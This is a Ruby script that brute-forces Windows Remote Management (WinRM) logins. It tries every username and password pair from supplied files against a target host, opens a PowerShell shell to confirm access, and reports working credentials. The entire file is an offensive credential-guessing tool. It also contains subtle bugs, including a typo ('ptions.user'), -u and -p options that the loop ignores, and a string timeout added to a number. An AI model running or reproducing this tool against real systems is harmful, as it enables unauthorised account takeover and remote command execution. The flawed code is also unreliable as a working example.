#!/usr/bin/env ruby

require 'optparse'
require 'ostruct'
require 'winrm'

# Extends string class with colorized output
class String
  # colorization
  def colorize(color_code)
    "\e[#{color_code}m#{self}\e[0m"
  end

  def red
    colorize(31)
  end

  def green
    colorize(32)
  end

  def yellow
    colorize(33)
  end

  def blue
    colorize(34)
  end

  def pink
    colorize(35)
  end

  def light_blue
    colorize(36)
  end
end

options = OpenStruct.new
options.uri = "/wsman"
options.port = "5985"
options.timeout = 2

optparse = OptionParser.new do |opts|
  opts.banner = "Usage: winrm-brute.rb [options]"
  opts.banner += " HOST"

  opts.on("-u USER",
          "A specific username to authenticate as") do |user|
    ptions.user = user
  end

  opts.on("-U USERFILE",
          "File containing usernames, one per line") do |userfile|
    options.userfile = userfile
  end

  opts.on("-p PASSWORD",
          "A specific password to authenticate with") do |passwd|
    options.passwd = passwd
  end

  opts.on("-P PASSWORDFILE",
          "File containing passwords, one per line") do |passwdfile|
    options.passwdfile = passwdfile
  end

  opts.on("-t TIMEOUT",
          "Timeout for each attempt, in seconds (default: 2)") do |timeout|
    options.timeout = timeout
  end

  opts.on("-q", "--quiet",
          "Do not write all login attempts") do |quiet|
    options.quiet = quiet
  end

  opts.on("--port=PORT",
          "The target TCP port (default: 5985)") do |port|
    options.port = port
  end

  opts.on("--uri=URI",
          "The URI of the WinRM service (default: /wsman)") do |uri|
    options.uri = uri
  end

  opts.on_tail("-h", "--help", "Show this message") do
    puts opts
    exit
  end
end
optparse.parse!


# Check if host was provided
if ARGV.empty?
  puts "You must specify a target host!".red
  puts optparse
  exit(-1)
elsif not (options.passwdfile and options.userfile)
  puts "You must specify at least a pair of username and password".red
  puts optparse
  exit(-1)
end
target = ARGV.pop

# Define general authentication options
auth = {
  endpoint:  "http://#{target}:#{options.port}#{options.uri}",
  operation_timeout: options.timeout,
  receive_timeout: options.timeout + 2,
  retry_limit: 1
}

# Run for a specific
File.readlines(options.userfile, chomp: true).each do |user|
  File.readlines(options.passwdfile, chomp: true).each do |passwd|
    puts "Trying #{user}:#{passwd}" unless options.quiet
    auth[:user] = user
    auth[:password] = passwd
    conn = WinRM::Connection.new(auth)
    #conn.logger.level = :debug
    begin
      conn.shell(:powershell) do |shell|
        output = shell.run('$PSVersionTable') do |stdout, stderr|
          #STDOUT.print stdout
          #STDERR.print stderr
        end
        #puts "The script exited with exit code #{output.exitcode}"
      end
    rescue WinRM::WinRMAuthorizationError
    rescue => e
      puts "Caught exception #{e}"
    else
      puts "[SUCCESS] user: #{user} password: #{passwd}".green
    end
  end
end
